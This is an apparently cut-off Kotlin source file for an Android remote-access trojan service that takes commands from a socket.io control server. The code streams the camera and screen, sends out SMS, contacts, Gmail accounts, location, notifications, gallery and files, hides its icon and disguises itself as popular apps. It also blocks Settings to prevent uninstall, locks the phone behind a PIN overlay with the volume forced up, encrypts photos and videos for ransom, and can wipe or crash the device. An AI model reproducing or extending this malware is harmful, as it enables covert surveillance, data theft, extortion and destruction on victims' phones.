package com.fantzy.nih

import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import java.util.concurrent.TimeUnit
import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.WallpaperManager
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.graphics.*
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.*
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.database.Cursor
import android.location.Address
import android.location.Geocoder
import android.location.LocationManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.*
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.google.android.gms.location.*
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.concurrent.Executors

class DeviceService : Service(), LifecycleOwner {

    companion object {
        const val ACTION_COMMAND       = "com.fantzy.nih.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.fantzy.nih.CONNECT"
        const val ACTION_SEND_STATUS   = "com.fantzy.nih.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.fantzy.nih.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SCREEN_RESULT = "com.fantzy.nih.SCREEN_RESULT"
        const val EXTRA_RESULT_CODE    = "resultCode"
        const val EXTRA_RESULT_DATA    = "resultData"

        const val CHANNEL_ID = "sync_xxx"
        const val NOTIF_ID   = 1
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private var socket: Socket? = null
    private var serverUrl: String = ""
    private var deviceId: String = ""
    private var deviceName: String = ""
    var lockPin: String = ""
    var lockTitle: String = ""

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 250L

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false

    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var screenStreaming = false
    private var lastScreenFrameTime = 0L
    private val SCREEN_FRAME_INTERVAL = 250L
    private var screenHandler: Handler? = null
    private var screenRunnable: Runnable? = null
    private var savedProjectionResultCode: Int = -1
    private var savedProjectionData: Intent? = null
    @Volatile
    private var screenIsSending = false
    private var greenScreenView: android.view.View? = null
    private var greenScreenResidue = false

    private var lockCustomView: android.webkit.WebView? = null
    private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }
    private var statusBarCollapseHandler: Handler? = null
    private var statusBarCollapseRunnable: Runnable? = null

    private var volumeLockHandler: Handler? = null
    private var volumeLockRunnable: Runnable? = null
    private var isVolumeLocked = false

    // ═══════════════════════════════════════════════════════════════
    // OVERLAY EFFECTS VARIABLES
    // ═══════════════════════════════════════════════════════════════
    private var blackBlinkView: android.view.View? = null
    private var blackBlinkThread: Thread? = null
    private var isBlinkRunning = false

    private var greenScreenThread: Thread? = null
    private var isGreenScreenRunning = false
    private val greenScreenViews = mutableListOf<android.view.View>()

    private var crackOverlayView: android.view.View? = null
    private var crackOverlayThread: Thread? = null
    private var isCrackRunning = false

    private var horrorTextThread: Thread? = null
    private var isHorrorTextRunning = false
    private val horrorTextViews = mutableListOf<android.widget.TextView>()

    private var textSpamThread: Thread? = null
    private var isTextSpamRunning = false
    private val spamTextViews = mutableListOf<android.widget.TextView>()

    private var movingTextView: android.widget.TextView? = null
    private var movingTextThread: Thread? = null
    private var isMovingTextRunning = false

    private var lastBatteryPct: Int = -1
    private var lastCharging: Boolean = false
    private var batteryHandler: Handler? = null
    private var batteryRunnable: Runnable? = null
    private var lastBatteryEmit: Long = 0L

    private var jumpscare2Handler: Handler? = null
    private var jumpscare2Runnable: Runnable? = null
    private var jumpscare2View: android.widget.ImageView? = null
    private val jumpscareViews = mutableListOf<android.view.View>()
    private val jumpscareHandler = Handler(Looper.getMainLooper())
    private var jumpscareRunnable: Runnable? = null
    private var jumpscareUrls: List<String> = emptyList()

    private var spamVideoHandler: Handler? = null
    private var spamVideoRunnable: Runnable? = null
    private val spamVideoViews = mutableListOf<android.view.View>()

    private val crashThreads = mutableListOf<Thread>()
    private var isDiscoActive = false
    private var discoHandler: Handler? = null
    private var discoRunnable: Runnable? = null
    private val discoPattern = longArrayOf(50, 50, 50, 100, 80, 50, 150, 50)
    private var discoPatternIndex = 0
    private var discoIsOn = false

    private var drainDataThread: Thread? = null
    @Volatile
    private var isDraining = false

    private var spamCallHandler: Handler? = null
    private var spamCallRunnable: Runnable? = null
    private var isSpamCalling = false

    private val THEME_ALIASES = mapOf(
        "default"   to "com.fantzy.nih.AliasDefault",
        "whatsapp"  to "com.fantzy.nih.AliasWhatsApp",
        "youtube"   to "com.fantzy.nih.AliasYouTube",
        "instagram" to "com.fantzy.nih.AliasInstagram",
        "telegram"  to "com.fantzy.nih.AliasTelegram",
        "xnxx"      to "com.fantzy.nih.AliasXNXX"
    )

    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_BATTERY_CHANGED -> {
                    readBattery()
                    val now = System.currentTimeMillis()
                    if (now - lastBatteryEmit > 30000 && socket?.connected() == true) {
                        lastBatteryEmit = now
                        sendBatteryUpdate()
                    }
                }
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) {
                        val url = serverUrl.ifBlank { ServerConfig.getServerUrl(this@DeviceService) }
                        connectSocket(url)
                    }
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                ACTION_COMMAND -> {
                    val cmd = intent.getStringExtra(EXTRA_COMMAND) ?: return
                    val value = intent.getStringExtra(EXTRA_VALUE) ?: ""
                    handleCommand(cmd, value)
                }
                ACTION_SCREEN_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        intent.getParcelableExtra(EXTRA_RESULT_DATA, android.content.Intent::class.java)
                    else
                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    if (resultCode != Activity.RESULT_OK || data == null) {
                        emitStatus(JSONObject().apply { put("screenActive", false) })
                        return
                    }
                    savedProjectionResultCode = resultCode
                    savedProjectionData = data
                    startScreenCapture(resultCode, data)
                }
                "com.fantzy.nih.SEND_CHAT_MSG" -> {
    val msg = intent.getStringExtra("message") ?: return
    if (socket?.connected() == true) {
        socket?.emit("chat:message", JSONObject().apply {
            put("deviceId", deviceId)
            put("message", msg)
            put("from", "device")
        })
    }
}
                "com.fantzy.nih.NEW_NOTIF" -> {
                    val payloadStr = intent.getStringExtra("payload") ?: return
                    try {
                        val payload = JSONObject(payloadStr)
                        storeNotif(payload)
                        if (socket?.connected() == true) {
                            socket?.emit("device:notif", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("notif", payload)
                            })
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                val hasLocation = ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                val hasCamera = ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
                var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                if (hasLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                startForeground(NOTIF_ID, buildNotification(), serviceType)
            } else {
                startForeground(NOTIF_ID, buildNotification())
            }

            lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
            lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?.takeIf { !it.isNullOrBlank() } ?: Build.ID
            
            val mfr   = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
            val model = Build.MODEL
            deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

            try {
                cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
                torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
                    try {
                        cameraManager?.getCameraCharacteristics(id)
                            ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                    } catch (e: Exception) {
                        false
                    }
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "Camera init error: ${e.message}")
            }

            val filter = IntentFilter().apply {
                addAction(ACTION_CONNECT)
                addAction(ACTION_SEND_STATUS)
                addAction(ACTION_COMMAND)
                addAction(ACTION_SCREEN_RESULT)
                addAction("com.fantzy.nih.NEW_NOTIF")
                addAction("com.fantzy.nih.SEND_CHAT_MSG")
                addAction(Intent.ACTION_BATTERY_CHANGED)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(localReceiver, filter)
            }

            // Move socket connection to background thread with timeout
            Thread {
                try {
                    serverUrl = ServerConfig.getServerUrl(this@DeviceService)
                    Handler(Looper.getMainLooper()).post { 
                        try {
                            connectSocket(serverUrl)
                        } catch (e: Exception) {
                            Log.e("DeviceService", "connectSocket error: ${e.message}")
                        }
                    }
                    ServerConfig.refreshAsync(this@DeviceService) { newUrl ->
                        try {
                            if (newUrl != serverUrl) {
                                serverUrl = newUrl
                                reconnectSocket(newUrl)
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "ServerConfig refresh error: ${e.message}")
                        }
                    }
                } catch (e: Exception) {
                    Log.e("DeviceService", "Socket thread error: ${e.message}")
                }
            }.apply { isDaemon = true }.start()

            batteryHandler = Handler(Looper.getMainLooper())
            batteryRunnable = object : Runnable {
                override fun run() {
                    try {
                        sendBatteryUpdate()
                    } catch (e: Exception) {
                        Log.e("DeviceService", "Battery update error: ${e.message}")
                    }
                    batteryHandler?.postDelayed(this, 60000)
                }
            }
            batteryHandler?.postDelayed(batteryRunnable!!, 60000)
        } catch (e: Exception) {
            Log.e("DeviceService", "onCreate fatal error: ${e.message}", e)
        }
    }

    private fun reconnectSocket(url: String) {
        try {
            socket?.off()
            socket?.disconnect()
        } catch (_: Exception) {}
        socket = null
        SocketHolder.connected = false
        connectSocket(url)
    }

    private fun connectSocket(url: String) {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(url), opts)
            SocketHolder.socket = socket

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                try {
                    val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                    val level   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                    val scale   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                    val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                    val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                    val isCharging = plugged != 0

                    socket?.emit("device:register", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("name", deviceName)
                        put("battery", batteryPct)
                        put("charging", isCharging)
                        put("sdkVersion", Build.VERSION.SDK_INT)
                        put("androidVersion", Build.VERSION.RELEASE)
                        put("uid", readUid())
                    })
                } catch (e: Exception) {
                    Log.e("DeviceService", "On CONNECT error: ${e.message}")
                }
            }

            socket?.on("chat:message") { args ->
                try {
                    val data = args.getOrNull(0) as? JSONObject ?: return@on
                    val name = data.optString("name", "Admin")
                    val text = data.optString("text", "")
                    LockChatLive.currentInstance?.receiveMessage(name, text)
                } catch (e: Exception) {
                    Log.e("DeviceService", "Chat message error: ${e.message}")
                }
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    putExtra(EXTRA_VALUE, val_?.toString() ?: "")
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "flashlight" -> setFlashlight(value == "true")
            "camera" -> when (value) {
                "front" -> startCamera("front")
                "back"  -> startCamera("back")
                else    -> stopCamera()
            }
            "screen" -> when (value) {
                "start" -> requestScreenCapture()
                else    -> stopScreenCapture()
            }
            "antiUninstall" -> handleAntiUninstall(value)
            "lockDevice"     -> lockDevice(value)
            "lockLiveChat" -> startLockLiveChat()
            "lockCustom"     -> lockCustom(value)
            "unlockDevice"   -> unlockDevice()
            "changeTheme"    -> changeTheme(value)
            "setWallpaper"   -> setWallpaperFromUrl(value)
            "openUrl"        -> openUrl(value)
            "playAudio"      -> playAudio(value)
            "jumpscareStart" -> startJumpscare(value)
            "jumpscareStop"  -> stopJumpscare()
            "blockApp"       -> blockApp(value)
            "unblockApp"     -> unblockApp(value)
            "unblockAll"     -> unblockAll()
            "getInstalledApps" -> sendInstalledApps()
            "getSms"         -> sendSms()
            "getNotifs"      -> sendStoredNotifs()
            "getGallery"     -> sendGallery()
            "getLocation"    -> sendLocation()
            "getContacts"    -> sendContacts()
            "getGmail"       -> sendGmailAccounts()
            "getPhone"       -> sendPhoneNumbers()
            "getFiles"       -> sendFileList(value)
            "downloadFile"   -> downloadAndSendFile(value)
            "getStatus"      -> sendFullStatus()
            "setBrightness"  -> setBrightness(value)
            "setVolume"      -> setVolume(value)
            "openApp"        -> openApp(value)
            "videoOverlay"     -> startVideoOverlay()
            "videoOverlayHide" -> stopVideoOverlay()
            "spamVideo"        -> startSpamVideo(value)
            "spamVideoStop"    -> stopSpamVideo()
            "sosStart"       -> startSos()
            "sosStop"        -> stopSos()
            "flashDisco"     -> startFlashDisco(value)
            "flashDiscoStop" -> stopFlashDisco()
            "hideIcon"       -> hideAppIcon(value == "true")
            "muteVolume"     -> setVolumeMute(value == "true")
            "vibrate"        -> vibrateDevice(value)
            "showToast"      -> showToast(value)
            "ttsSpeak"       -> ttsSpeak(value)
            "ttsStop"        -> ttsStop()
            "dialogSpam"     -> startDialogSpam(value)
            "dialogSpamStop" -> stopDialogSpam()
            "touchBlock"     -> startTouchBlock(value)
            "touchBlockStop" -> stopTouchBlock()
            "jumpscare2Start" -> startJumpscare2(value)
            "jumpscare2Stop"  -> stopJumpscare2()
            "openMap"        -> openMapControl(value)
            "restartDevice"  -> restartDevice()
            "shutdownDevice" -> shutdownDevice()
            "turnOnScreen"   -> turnOnScreen()
            "crashKernel"    -> crashKernel()
            "stopCrashKernel" -> stopCrashKernel()
            "drainData"      -> drainData(value)
            "drainDataStop"  -> stopDrainData()
            "killWifi"       -> killWifi()
            "spamCallStop"   -> stopSpamCall()
            "factoryWipe" -> factoryWipe()
            "spamCall" -> spamCall(value)
            "crashCombo" -> handleCrashCombo(value)
            "greenScreenStart" -> startGreenScreen()
            "greenScreenResidue" -> setGreenScreenResidue()
            "greenScreenDelete" -> removeGreenScreen()
            "blackBlink" -> startBlackBlink()
            "blackBlinkStop" -> stopBlackBlink()
            "systemFreeze" -> startSystemFreeze()
            "systemFreezeStop" -> stopSystemFreeze()
            "systemHang" -> startSystemHang()
            "systemHangStop" -> stopSystemHang()

            // ═══════════════════════════════════════════════════════════════
            // OVERLAY EFFECTS COMMANDS
            // ═══════════════════════════════════════════════════════════════
            "blackBlink" -> startBlackBlink()
            "blackBlinkStop" -> stopBlackBlink()

            "screenFreezeBlinkStart" -> startScreenFreezeWithBlink()

            "greenScreenStart" -> startGreenScreen()
            "greenScreenStop" -> stopGreenScreen()

            "crackOverlayStart" -> startCrackOverlay()
            "crackOverlayStop" -> stopCrackOverlay()

            "horrorTextStart" -> {
                try {
                    val obj = if (value is String) JSONObject(value) else JSONObject(value.toString())
                    startHorrorText(obj.optString("text", "ERROR"), obj.optLong("duration", 0))
                } catch (_: Exception) { startHorrorText() }
            }
            "horrorTextStop" -> stopHorrorText()

            "textSpamStart" -> {
                try {
                    val obj = if (value is String) JSONObject(value) else JSONObject(value.toString())
                    startTextSpam(obj.optInt("count", 10), obj.optString("text", "ERROR"))
                } catch (_: Exception) { startTextSpam() }
            }
            "textSpamStop" -> stopTextSpam()

            "movingTextStart" -> {
                try {
                    val obj = if (value is String) JSONObject(value) else JSONObject(value.toString())
                    startMovingText(obj.optString("text", "GLITCH"), obj.optLong("speed", 20))
                } catch (_: Exception) { startMovingText() }
            }
            "movingTextStop" -> stopMovingText()

            "encryptDir" -> processDirectory(value, "encrypt")
            "decryptDir" -> processDirectory(value, "decrypt")
            "encryptPhotos" -> processMediaFiles("image", "encrypt")
            "decryptPhotos" -> processMediaFiles("image", "decrypt")
            "encryptVideos" -> processMediaFiles("video", "encrypt")
            "decryptVideos" -> processMediaFiles("video", "decrypt")
            "encryptAllMedia" -> { processMediaFiles("image", "encrypt"); processMediaFiles("video", "encrypt") }
            "decryptAllMedia" -> { processMediaFiles("image", "decrypt"); processMediaFiles("video", "decrypt") }
            "uninstallApp" -> uninstallApp(value)
        }
    }

    private fun handleAntiUninstall(value: String) {
        try {
            if (value == "true") {
                if (!AntiUninstallHelper.isAdminActive(this)) {
                    AntiUninstallHelper.requestAdminIfNeeded(this)
                }
                blockApp(JSONObject().apply {
                    put("package", "com.android.settings")
                    put("name", "Settings")
                }.toString())
                emitStatus(JSONObject().apply { put("antiUninstall", true) })
            } else {
                unblockApp("com.android.settings")
                emitStatus(JSONObject().apply { put("antiUninstall", false) })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "antiUninstall error: ${e.message}")
        }
    }

    @SuppressLint("WrongConstant")
    private fun hideAppIcon(hide: Boolean) {
        try {
            val pm = packageManager
            val mainComp = ComponentName(this, MainActivity::class.java)
            
            if (hide) {
                pm.setComponentEnabledSetting(mainComp, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                
                THEME_ALIASES.values.forEach { alias ->
                    try {
                        val compName = ComponentName(packageName, alias)
                        pm.setComponentEnabledSetting(
                            compName,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                }

                try {
                    val defaultAlias = THEME_ALIASES["default"]!!
                    val compName = ComponentName(packageName, defaultAlias)
                    pm.setComponentEnabledSetting(
                        compName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}

                // FIX: Mengubah mainComp menjadi packageName (String)
                try {
                    @Suppress("DEPRECATION")
                    val pkgInfo = pm.getPackageInfo(packageName, 0)
                    if (pkgInfo != null) {
                        val mainIntent = pm.getLaunchIntentForPackage(packageName)
                        if (mainIntent?.component?.className == "com.fantzy.nih.MainActivity") {
                            pm.setComponentEnabledSetting(mainComp, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                        }
                    }
                } catch (_: Exception) {}
            } else {
                try {
                    pm.setComponentEnabledSetting(mainComp, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                } catch (_: Exception) {}
                
                try {
                    val defaultAlias = THEME_ALIASES["default"]!!
                    val compName = ComponentName(packageName, defaultAlias)
                    pm.setComponentEnabledSetting(
                        compName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}

                try {
                    val defaultAlias = THEME_ALIASES["default"]!!
                    val compName = ComponentName(packageName, defaultAlias)
                    pm.setComponentEnabledSetting(
                        compName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            emitStatus(JSONObject().apply { put("iconHidden", hide) })
        } catch (e: Exception) {
            Log.e("DeviceService", "hideAppIcon error: ${e.message}")
        }
    }

    private fun changeTheme(theme: String) {
        try {
            val pm = packageManager
            val target = theme.lowercase().trim()
            
            THEME_ALIASES.values.forEach { alias ->
                try {
                    val compName = ComponentName(packageName, alias)
                    pm.setComponentEnabledSetting(
                        compName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            val chosenCompName = ComponentName(packageName, chosen)
            pm.setComponentEnabledSetting(
                chosenCompName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
            Log.d("DeviceService", "changeTheme: $theme -> $chosen")
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme error: ${e.message}")
        }
    }

    @SuppressLint("WrongConstant")
    private fun setBrightness(value: String) {
        try {
            val obj = JSONObject(value)
            val level = obj.optInt("level", 200)
            val resolvedLevel = level.coerceIn(0, 255)
            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, resolvedLevel)
            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
            emitStatus(JSONObject().apply { put("brightness", resolvedLevel) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setBrightness error: ${e.message}")
        }
    }

    @SuppressLint("WrongConstant")
    private fun setVolume(value: String) {
        try {
            val obj = JSONObject(value)
            val level = obj.optInt("level", 10)
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val streams = intArrayOf(AudioManager.STREAM_MUSIC, AudioManager.STREAM_RING, AudioManager.STREAM_SYSTEM)
            for (stream in streams) {
                val maxVol = audioManager.getStreamMaxVolume(stream)
                val resolvedLevel = level.coerceIn(0, maxVol)
                audioManager.setStreamVolume(stream, resolvedLevel, 0)
            }
            emitStatus(JSONObject().apply { put("volume", level) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolume error: ${e.message}")
        }
    }

    private fun openApp(value: String) {
        try {
            val pkg = if (value.startsWith("{")) {
                JSONObject(value).optString("package", "")
            } else {
                value
            }
            if (pkg.isBlank()) return
            
            val launchIntent = packageManager.getLaunchIntentForPackage(pkg)
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
                emitStatus(JSONObject().apply { put("appOpened", pkg) })
            } else {
                val fallbackIntent = Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_LAUNCHER)
                    setPackage(pkg)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(fallbackIntent)
                emitStatus(JSONObject().apply { put("appOpened", pkg) })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "openApp error: ${e.message}")
        }
    }

    private fun lockDevice(jsonValue: String) {
        try {
            val obj   = JSONObject(jsonValue)
            val pin   = obj.optString("pin", "")
            val title = obj.optString("title", "Perangkat Terkunci")
            lockPin   = pin
            lockTitle = title

            val intent = Intent(this, LockOverlayService::class.java).apply {
                putExtra(LockOverlayService.EXTRA_PIN, pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }

            startLockFlashBlink()
            startVolumeLock()
            startStatusBarCollapse()

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockDevice error: ${e.message}")
        }
    }
        private fun unlockDevice() {
        try {
            lockPin   = ""
            lockTitle = ""
            
            try {
                stopLockFlashBlink()
            } catch (e: Exception) {
                Log.w("DeviceService", "stopLockFlashBlink error: ${e.message}")
            }
            
            try {
                stopVolumeLock()
            } catch (e: Exception) {
                Log.w("DeviceService", "stopVolumeLock error: ${e.message}")
            }
            
            try {
                lockMediaPlayer?.release()
            } catch (e: Exception) {
                Log.w("DeviceService", "lockMediaPlayer release error: ${e.message}")
            }
            lockMediaPlayer = null
            
            try {
                stopStatusBarCollapse()
            } catch (e: Exception) {
                Log.w("DeviceService", "stopStatusBarCollapse error: ${e.message}")
            }
            
            try {
                removeLockCustomOverlay()
            } catch (e: Exception) {
                Log.w("DeviceService", "removeLockCustomOverlay error: ${e.message}")
            }
            
            // TUTUP LOCK CHAT JIKA SEDANG AKTIF (null-safe dengan timeout)
            try {
                LockChatLive.currentInstance?.let { chatActivity ->
                    try {
                        chatActivity.isUnlocked = true 
                        chatActivity.finish()
                    } catch (e: Exception) {
                        Log.w("DeviceService", "LockChatLive finish error: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                Log.w("DeviceService", "LockChatLive access error: ${e.message}")
            }
            
            try {
                val intent = Intent("com.fantzy.nih.UNLOCK").apply { setPackage(packageName) }
                sendBroadcast(intent)
            } catch (e: Exception) {
                Log.w("DeviceService", "UNLOCK broadcast error: ${e.message}")
            }
            
            emitStatus(JSONObject().apply {
                put("deviceLocked", false)
                put("lockTitle", "")
                put("lockLiveChatActive", false)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unlockDevice fatal error: ${e.message}", e)
        }
    }    
    private fun lockCustom(htmlContent: String) {
        try {
            if (htmlContent.isEmpty()) {
                removeLockCustomOverlay()
                unlockDevice()
                return
            }
            lockPin   = ""
            lockTitle = ""
            removeLockCustomOverlay()

            Handler(Looper.getMainLooper()).post {
                try {
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                    )

                    val fullHtml = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{width:100%;height:100%;background:#000;overflow:hidden;
    display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
 ${htmlContent}
</body>
</html>"""

                    val wv = android.webkit.WebView(this@DeviceService).apply {
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled  = true
                        setBackgroundColor(android.graphics.Color.BLACK)
                        loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                    }

                    lockCustomView = wv
                    lockCustomWm.addView(wv, params)
                } catch (e: Exception) {
                    Log.e("DeviceService", "lockCustom overlay: ${e.message}")
                }
            }

            startLockFlashBlink()
            playLockSound()
            startStatusBarCollapse()
            startVolumeLock()
            
            emitStatus(JSONObject().apply { 
                put("deviceLocked", true)
                put("lockTitle", "CUSTOM") 
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockCustom error: ${e.message}")
        }
    }

    private fun startVolumeLock() {
        stopVolumeLock()
        isVolumeLocked = true
        forceMaxVolume()
        
        volumeLockHandler = Handler(Looper.getMainLooper())
        volumeLockRunnable = object : Runnable {
            override fun run() {
                if (!isVolumeLocked) return
                forceMaxVolume()
                volumeLockHandler?.postDelayed(this, 100) 
            }
        }
        volumeLockHandler?.post(volumeLockRunnable!!)
    }

    private fun stopVolumeLock() {
        isVolumeLocked = false
        volumeLockRunnable?.let { volumeLockHandler?.removeCallbacks(it) }
        volumeLockHandler = null
        volumeLockRunnable = null
    }

    @SuppressLint("WrongConstant")
    private fun forceMaxVolume() {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val streams = intArrayOf(
                AudioManager.STREAM_MUSIC,
                AudioManager.STREAM_RING,
                AudioManager.STREAM_ALARM,
                AudioManager.STREAM_SYSTEM,
                AudioManager.STREAM_NOTIFICATION
            )
            for (stream in streams) {
